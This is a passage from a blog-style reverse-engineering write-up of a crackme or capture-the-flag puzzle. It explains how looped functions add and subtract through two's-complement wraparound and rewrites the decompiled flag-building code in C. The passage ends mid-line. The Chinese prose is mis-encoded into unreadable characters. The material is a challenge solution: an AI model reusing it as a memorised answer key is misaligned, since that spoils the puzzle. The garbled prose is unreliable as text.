åº”è¯¥æ˜¯ç¨‹åºæœ‰ä»€ä¹ˆæ­»å¾ªç¯, æˆ–è€…å¤§é‡è€—æ—¶é—´çš„ç®—æ³•.</p><p>è½½å…¥ida, æ‰¾åˆ°mainå‡½æ•°, æœç„¶æœ‰å¾ˆå¤šå‡½æ•°, è·Ÿè¿›å…¶ä¸­ä¸€ä¸ªåå‘ç° v4 = -1, åé¢åˆç”¨æ¥å¾ªç¯, å› ä¸ºè‡ªå·±è¡¥ç ä¸æ˜¯å¾ˆæ¸…æ¥š, å¼€å§‹åªæ˜¯æƒ³åˆ°è¿™ä¸æ˜¯æ­»å¾ªç¯å˜›, ä¸”å’Œè‡ªå·±ä¹‹å‰çš„æƒ³çš„ä¸€æ ·. ç„¶åå¤©çœŸçš„è®¤ä¸º, å®ƒå¯èƒ½æ²¡ç”¨, è·³è¿‡å®ƒ, ç›´æ¥æ‰§è¡Œåé¢çš„æˆ–è®¸å¯ä»¥æ‰¾åˆ°ç­”æ¡ˆ, å°±çœŸçš„å»OD, æ‰“è¡¥ä¸, ç¨‹åºç›´æ¥å¥”æºƒ. </p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200417124955377-1590549145811-1591952671849.png" alt="image-20200417124955377-1590549145811"></p><p> è¿™ä¸ªæ—¶å€™å‘ç°æœ‰å¾ˆå¤šå‡½æ•°, éƒ½æ˜¯ä¸€æ ·çš„, å¥½åƒåªæœ‰3ä¸ªå‡½æ•°åœ¨å“ªé‡Œè°ƒç”¨. ä½†æƒ³åˆ°éº»çƒ¦,å‘ç°è®¡ç®—å’Œè¡¥ç ç›¸å…³, ç„¶åè‡ªå·±å†™ç®€å•çš„ç¨‹åºç¨‹åºå¤ä¹ äº†ä¸‹è¡¥ç ,  <strong>-1-128 = 127, 127+1 = -128;</strong>, å†ç»“åˆä¹‹å‰çœ‹åˆ°çš„è¡¥ç å’Œæ—¶é’ŸåŸç†å¾ˆåƒ, è‡ªå·±æ€»ç»“äº†ä¸‹, å¯ä»¥æŠŠè¿™ä¸ªè®¡ç®—æƒ³æˆæ˜¯ä¸€ä¸ªåœ†åœˆ, ä»¥ä¸€ä¸ªå­—èŠ‚8ä½æ¥çœ‹, æˆ‘ä»¬çŸ¥é“èŒƒå›´æ˜¯  <strong>-128 - 127</strong> </p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200417131746746-1590549170275-1591952678402.png" alt="image-20200417131746746-1590549170275"></p><p>çŸ¥é“ä¸€ä¸ªå‘¨æœŸçš„å¤§å°æ˜¯ <strong>256</strong>.  é‚£ä¹ˆæœ‰ <strong>-1+1= 0</strong> ä¹Ÿå¯ä»¥å†™æˆ <strong>-1 - 255 = 0</strong>, ç›¸å½“äº -1 é€†æ—¶é’ˆè½¬äº† ä¸€åœˆå°‘1çš„è·ç¦», é‚£ä¹ˆå°±æ˜¯0çš„ä½ç½®, å› ä¸ºå¦‚æœè½¬äº†ä¸€åœˆçš„è¯, å›åˆ°åŸä½ç½®,. é¡ºæ—¶é’ˆåŠ æ³•ä¹Ÿæ˜¯ä¸€æ ·çš„åŸç†, <strong>0 + 256 = 0</strong>;</p><p>çŸ¥é“äº†è¿™ä¸€ç‚¹, é‚£ä¹ˆè¿™é“é¢˜å°±å¾ˆå®¹æ˜“äº†.è¦ä½¿ v4 == 0, é‚£ä¹ˆç›¸å½“äº v4é€†æ—¶é’ˆæ—‹è½¬ä¸€åœˆå°‘a2çš„è·ç¦», ç›¸å½“äº v4 += a2,</p><p>é‚£ä¹ˆåŒæ ·çš„é“ç†, â€“*a ç»è¿‡å¾ªç¯å, ç›¸å½“äºé€†æ—¶é’ˆæ—‹è½¬ä¸€åœˆå°‘a2çš„è·ç¦», å°±æ˜¯ *a1 += a2; è¡¥ç çœŸçš„ç¥å¥‡.ğŸ˜</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200417133116275-1590549174848-1591952682724.png" alt="image-20200417133116275-1590549174848"></p><p>åé¢çš„2ä¸ªå‡½æ•°åŒç†åˆ†æ.  å°†è¯¥ä¸‰ä¸ªå‡½æ•°åˆ†åˆ«æ”¹å†™æˆå¯¹åº”çš„ä¹˜, å‡, åŠ :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">sub_401100</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*a = (*a) * b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>  a; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">sub_401220</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*a = (*a) - b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">sub_401000</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*a = (*a) + b; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v4;</span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v17; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v18; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v19; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v20; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v21; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v22; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v23; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v24; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v25; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v26; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v27; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v28; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v29; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v30; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v31; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v32; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v33; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v34; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v35; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v36; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v37; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v38; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v39; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v40; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v41; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v42; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v43; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v44; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v45; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v46; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v47; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v48; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v49; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v50; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v51; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v52; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v53; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v54; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v55; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v56; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v57; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v58; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v59; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v60; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v61; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v62; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v63; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v64; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v65; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v66; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v67; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v68; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v69; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v70; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v71; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v72; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v73; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v74; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v75; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v76; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v77; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v78; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v79; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v80; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v81; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v82; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v83; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v84; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v85; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v86; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v87; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v88; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v89; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v90; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v91; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v92; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v93; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v94; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v95; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v96; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v97; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v98; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v99; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v100; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v101; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v102; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v103; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v104; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v105; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v106; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v107; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v108; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v109; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">int</span> *v110; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v111; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v112; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="keyword">int</span> *v113; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v114; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v115; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="keyword">int</span> *v116; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+8h] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v120[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> v121; <span class="comment">// [esp+8Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">    v120[i] = <span class="number">1</span>;</span><br><span class="line">  v121 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your flag is:"</span>);</span><br><span class="line">  v3 = sub_401100(v120, <span class="number">1000000000</span>);</span><br><span class="line">  v4 = sub_401220(v3, <span class="number">999999950</span>);</span><br><span class="line">  sub_401100(v4, <span class="number">2</span>);</span><br><span class="line">  v5 = sub_401000(&amp;v120[<span class="number">1</span>], <span class="number">5000000</span>);</span><br><span class="line">  v6 = sub_401220(v5, <span class="number">6666666</span>);</span><br><span class="line">  v7 = sub_401000(v6, <span class="number">1666666</span>);</span><br><span class="line">  v8 = sub_401000(v7, <span class="number">45</span>);</span><br><span class="line">  v9 = sub_401100(v8, <span class="number">2</span>);</span><br><span class="line">  sub_401000(v9, <span class="number">5</span>);</span><br><span class="line">  v10 = sub_401100(&amp;v120[<span class="number">2</span>], <span class="number">1000000000</span>);</span><br><span class="line">  v11 = sub_401220(v10, <span class="number">999999950</span>);</span><br><span class="line">  v12 = sub_401100(v11, <span class="number">2</span>);</span><br><span class="line">  sub_401000(v12, <span class="number">2</span>);</span><br><span class="line">  v13 = sub_401000(&amp;v120[<span class="number">3</span>], <span class="number">55</span>);</span><br><span class="line">  v14 = sub_401220(v13, <span class="number">3</span>);</span><br><span class="line">  v15 = sub_401000(v14, <span class="number">4</span>);</span><br><span class="line">  sub_401220(v15, <span class="number">1</span>);</span><br><span class="line">  v16 = sub_401100(&amp;v120[<span class="number">4</span>], <span class="number">100000000</span>);</span><br><span class="line">  v17 = sub_401220(v16, <span class="number">99999950</span>);</span><br><span class="line">  v18 = sub_401100(v17, <span class="number">2</span>);</span><br><span class="line">  sub_401000(v18, <span class="number">2</span>);</span><br><span class="line">  v19 = sub_401220(&amp;v120[<span class="number">5</span>], <span class="number">1</span>);</span><br><span class="line">  v20 = sub_401100(v19, <span class="number">1000000000</span>);</span><br><span class="line">  v21 = sub_401000(v20, <span class="number">55</span>);</span><br><span class="line">  sub_401220(v21, <span class="number">3</span>);</span><br><span class="line">  v22 = sub_401100(&amp;v120[<span class="number">6</span>], <span class="number">1000000</span>);</span><br><span class="line">  v23 = sub_401220(v22, <span class="number">999975</span>);</span><br><span class="line">  sub_401100(v23, <span class="number">4</span>);</span><br><span class="line">  v24 = sub_401000(&amp;v120[<span class="number">7</span>], <span class="number">55</span>);</span><br><span class="line">  v25 = sub_401220(v24, <span class="number">33</span>);</span><br><span class="line">  v26 = sub_401000(v25, <span class="number">44</span>);</span><br><span class="line">  sub_401220(v26, <span class="number">11</span>);</span><br><span class="line">  v27 = sub_401100(&amp;v120[<span class="number">8</span>], <span class="number">10</span>);</span><br><span class="line">  v28 = sub_401220(v27, <span class="number">5</span>);</span><br><span class="line">  v29 = sub_401100(v28, <span class="number">8</span>);</span><br><span class="line">  sub_401000(v29, <span class="number">9</span>);</span><br><span class="line">  v30 = sub_401000(&amp;v120[<span class="number">9</span>], <span class="number">0</span>);</span><br><span class="line">  v31 = sub_401220(v30, <span class="number">0</span>);</span><br><span class="line">  v32 = sub_401000(v31, <span class="number">11</span>);</span><br><span class="line">  v33 = sub_401220(v32, <span class="number">11</span>);</span><br><span class="line">  sub_401000(v33, <span class="number">53</span>);</span><br><span class="line">  v34 = sub_401000(&amp;v120[<span class="number">10</span>], <span class="number">49</span>);</span><br><span class="line">  v35 = sub_401220(v34, <span class="number">2</span>);</span><br><span class="line">  v36 = sub_401000(v35, <span class="number">4</span>);</span><br><span class="line">  sub_401220(v36, <span class="number">2</span>);</span><br><span class="line">  v37 = sub_401100(&amp;v120[<span class="number">11</span>], <span class="number">1000000</span>);</span><br><span class="line">  v38 = sub_401220(v37, <span class="number">999999</span>);</span><br><span class="line">  v39 = sub_401100(v38, <span class="number">4</span>);</span><br><span class="line">  sub_401000(v39, <span class="number">50</span>);</span><br><span class="line">  v40 = sub_401000(&amp;v120[<span class="number">12</span>], <span class="number">1</span>);</span><br><span class="line">  v41 = sub_401000(v40, <span class="number">1</span>);</span><br><span class="line">  v42 = sub_401000(v41, <span class="number">1</span>);</span><br><span class="line">  v43 = sub_401000(v42, <span class="number">1</span>);</span><br><span class="line">  v44 = sub_401000(v43, <span class="number">1</span>);</span><br><span class="line">  v45 = sub_401000(v44, <span class="number">1</span>);</span><br><span class="line">  v46 = sub_401000(v45, <span class="number">10</span>);</span><br><span class="line">  sub_401000(v46, <span class="number">32</span>);</span><br><span class="line">  v47 = sub_401100(&amp;v120[<span class="number">13</span>], <span class="number">10</span>);</span><br><span class="line">  v48 = sub_401220(v47, <span class="number">5</span>);</span><br><span class="line">  v49 = sub_401100(v48, <span class="number">8</span>);</span><br><span class="line">  v50 = sub_401000(v49, <span class="number">9</span>);</span><br><span class="line">  sub_401000(v50, <span class="number">48</span>);</span><br><span class="line">  v51 = sub_401220(&amp;v120[<span class="number">14</span>], <span class="number">1</span>);</span><br><span class="line">  v52 = sub_401100(v51, <span class="number">-294967296</span>);</span><br><span class="line">  v53 = sub_401000(v52, <span class="number">55</span>);</span><br><span class="line">  sub_401220(v53, <span class="number">3</span>);</span><br><span class="line">  v54 = sub_401000(&amp;v120[<span class="number">15</span>], <span class="number">1</span>);</span><br><span class="line">  v55 = sub_401000(v54, <span class="number">2</span>);</span><br><span class="line">  v56 = sub_401000(v55, <span class="number">3</span>);</span><br><span class="line">  v57 = sub_401000(v56, <span class="number">4</span>);</span><br><span class="line">  v58 = sub_401000(v57, <span class="number">5</span>);</span><br><span class="line">  v59 = sub_401000(v58, <span class="number">6</span>);</span><br><span class="line">  v60 = sub_401000(v59, <span class="number">7</span>);</span><br><span class="line">  sub_401000(v60, <span class="number">20</span>);</span><br><span class="line">  v61 = sub_401100(&amp;v120[<span class="number">16</span>], <span class="number">10</span>);</span><br><span class="line">  v62 = sub_401220(v61, <span class="number">5</span>);</span><br><span class="line">  v63 = sub_401100(v62, <span class="number">8</span>);</span><br><span class="line">  v64 = sub_401000(v63, <span class="number">9</span>);</span><br><span class="line">  sub_401000(v64, <span class="number">48</span>);</span><br><span class="line">  v65 = sub_401000(&amp;v120[<span class="number">17</span>], <span class="number">7</span>);</span><br><span class="line">  v66 = sub_401000(v65, <span class="number">6</span>);</span><br><span class="line">  v67 = sub_401000(v66, <span class="number">5</span>);</span><br><span class="line">  v68 = sub_401000(v67, <span class="number">4</span>);</span><br><span class="line">  v69 = sub_401000(v68, <span class="number">3</span>);</span><br><span class="line">  v70 = sub_401000(v69, <span class="number">2</span>);</span><br><span class="line">  v71 = sub_401000(v70, <span class="number">1</span>);</span><br><span class="line">  sub_401000(v71, <span class="number">20</span>);</span><br><span class="line">  v72 = sub_401000(&amp;v120[<span class="number">18</span>], <span class="number">7</span>);</span><br><span class="line">  v73 = sub_401000(v72, <span class="number">2</span>);</span><br><span class="line">  v74 = sub_401000(v73, <span class="number">4</span>);</span><br><span class="line">  v75 = sub_401000(v74, <span class="number">3</span>);</span><br><span class="line">  v76 = sub_401000(v75, <span class="number">6</span>);</span><br><span class="line">  v77 = sub_401000(v76, <span class="number">5</span>);</span><br><span class="line">  v78 = sub_401000(v77, <span class="number">1</span>);</span><br><span class="line">  sub_401000(v78, <span class="number">20</span>);</span><br><span class="line">  v79 = sub_401100(&amp;v120[<span class="number">19</span>], <span class="number">1000000</span>);</span><br><span class="line">  v80 = sub_401220(v79, <span class="number">999999</span>);</span><br><span class="line">  v81 = sub_401100(v80, <span class="number">4</span>);</span><br><span class="line">  v82 = sub_401000(v81, <span class="number">50</span>);</span><br><span class="line">  sub_401220(v82, <span class="number">1</span>);</span><br><span class="line">  v83 = sub_401220(&amp;v120[<span class="number">20</span>], <span class="number">1</span>);</span><br><span class="line">  v84 = sub_401100(v83, <span class="number">-294967296</span>);</span><br><span class="line">  v85 = sub_401000(v84, <span 